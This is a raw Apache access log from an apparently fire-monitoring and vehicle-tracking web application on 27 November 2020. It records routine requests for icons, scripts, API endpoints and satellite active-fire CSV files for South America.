fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/bomb_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/moto_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/plane_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/truck_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/4x4_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/bomb_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/moto_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/plane_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/truck_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/4x4_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /images/icon/bomb_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:09 +0000] "GET /images/icon/moto_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:09 +0000] "GET /images/icon/plane_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:09 +0000] "GET /images/icon/truck_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:10 +0000] "GET /images/marker_home.png HTTP/1.1" 304 203 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:10 +0000] "GET /images/marker.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:12 +0000] "GET /service-worker.js HTTP/1.1" 200 1054 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:12 +0000] "GET /precache-manifest.2de4c6667ce5a517243463abc36823dd.js HTTP/1.1" 200 1384 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:08:40:16 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:08:40:17 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:08:40:20 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:40 +0000] "GET / HTTP/1.1" 200 2382 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:08 +0000] "GET /api/socket HTTP/1.1" 200 1090 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:41 +0000] "GET /static/css/2.863b9e4d.chunk.css HTTP/1.1" 200 8198 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:41 +0000] "GET /styles.css HTTP/1.1" 200 491 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:41 +0000] "GET /static/css/main.44efc054.chunk.css HTTP/1.1" 200 1347 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:41 +0000] "GET /static/js/main.9a12d3b4.chunk.js HTTP/1.1" 200 230672 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:41 +0000] "GET /static/js/2.7ae8e4df.chunk.js HTTP/1.1" 200 563725 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:44 +0000] "GET /api/session HTTP/1.1" 200 828 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:44 +0000] "GET /api/server HTTP/1.1" 200 719 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:44 +0000] "GET /favicon.png HTTP/1.1" 200 24853 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:45 +0000] "GET /api/devices HTTP/1.1" 200 678 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:01 +0000] "-" 408 543 "-" "-"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:01 +0000] "-" 408 3736 "-" "-"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:19 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_24h.csv HTTP/1.1" 200 103221 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:19 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_24h.csv HTTP/1.1" 200 475926 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:19 +0000] "GET /data/active_fire/noaa-20-viirs-c2/csv/J1_VIIRS_C2_South_America_24h.csv HTTP/1.1" 200 506084 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:27 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_48h.csv HTTP/1.1" 200 278141 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:27 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_48h.csv HTTP/1.1" 200 1327289 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:27 +0000] "GET /data/active_fire/noaa-20-viirs-c2/csv/J1_VIIRS_C2_South_America_48h.csv HTTP/1.1" 200 1455554 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:33 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_7d.csv HTTP/1.1" 200 928488 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:34 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_7d.csv HTTP/1.1" 200 4302692 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:41:34 +0000] "GET /data/active_fire/noaa-20-viirs-c2/csv/J1_VIIRS_C2_South_America_7d.csv HTTP/1.1" 200 4301874 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:48:10 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_48h.csv HTTP/1.1" 200 281334 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:48:10 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_48h.csv HTTP/1.1" 200 1358393 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:48:10 +0000] "GET /data/active_fire/noaa-20-viirs-c2/csv/J1_VIIRS_C2_South_America_48h.csv HTTP/1.1" 200 1460157 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:48:40 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_48h.csv HTTP/1.1" 304 732 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:48:40 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_48h.csv HTTP/1.1" 304 731 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:10 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_48h.csv HTTP/1.1" 304 731 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:10 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_48h.csv HTTP/1.1" 304 732 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:10 +0000] "GET /data/active_fire/noaa-20-viirs-c2/csv/J1_VIIRS_C2_South_America_48h.csv HTTP/1.1" 304 3925 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 188.43.235.177 - - [27/Nov/2020:08:39:13 +0000] "GET /api/socket HTTP/1.1" 200 4101 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
fenix.geolynx.com.ar:80 ::1 - - [27/Nov/2020:08:49:15 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:19 +0000] "GET /images/icon/bomb_blue.png HTTP/1.1" 304 746 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:19 +0000] "GET /images/icon/moto_blue.png HTTP/1.1" 304 746 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:19 +0000] "GET /images/icon/truck_blue.png HTTP/1.1" 304 3939 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:19 +0000] "GET /images/icon/plane_blue.png HTTP/1.1" 304 3939 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:20 +0000] "GET /images/icon/bomb_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:20 +0000] "GET /images/icon/plane_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:20 +0000] "GET /images/icon/moto_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:20 +0000] "GET /images/icon/truck_green.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:20 +0000] "GET /images/icon/bomb_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:21 +0000] "GET /images/icon/moto_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:21 +0000] "GET /images/icon/plane_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:21 +0000] "GET /images/icon/truck_grey.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:21 +0000] "GET /images/icon/bomb_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:49:21 +0000] "GET /images/icon/plane_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:40:46 +0000] "GET /api/socket HTTP/1.1" 200 1215 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:14 +0000] "GET /data/active_fire/c6/csv/MODIS_C6_South_America_7d.csv HTTP/1.1" 200 929032 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:21 +0000] "GET /api/users/2 HTTP/1.1" 200 1372 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:22 +0000] "GET /api/devices?all=true HTTP/1.1" 400 495 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:22 +0000] "GET /api/groups?all=true HTTP/1.1" 400 1069 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:22 +0000] "GET /api/devices?userId=2 HTTP/1.1" 200 1222 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:22 +0000] "GET /api/groups?userId=2 HTTP/1.1" 200 4166 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:14 +0000] "GET /data/active_fire/suomi-npp-viirs-c2/csv/SUOMI_VIIRS_C2_South_America_7d.csv HTTP/1.1" 200 4330625 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:54:14 +0000] "GET /data/active_fire/noaa-20-viirs-c2/csv/J1_VIIRS_C2_South_America_7d.csv HTTP/1.1" 200 4309670 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:27 +0000] "GET /windy.js HTTP/1.1" 200 1542 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:51:46 +0000] "GET /api/socket HTTP/1.1" 200 1138 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:39 +0000] "GET /styles.css HTTP/1.1" 200 1035 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:42 +0000] "GET /api/session HTTP/1.1" 200 1372 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:42 +0000] "GET /api/server HTTP/1.1" 200 719 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:42 +0000] "GET /api/devices HTTP/1.1" 200 678 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:43 +0000] "GET /manifest.json HTTP/1.1" 304 3939 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:43 +0000] "GET /images/icon/moto_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:43 +0000] "GET /images/icon/truck_orange.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:45 +0000] "GET /images/marker_home.png HTTP/1.1" 304 203 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:45 +0000] "GET /images/marker.png HTTP/1.1" 304 202 "https://fenix.geolynx.com.ar/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
fenix.geolynx.com.ar:443 181.10.31.82 - - [27/Nov/2020:08:56:47 +0000] "GET /service-worker.js HTTP/1.1" 200 1054 "https://fenix.geolynx.com.ar/service-worker.js" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
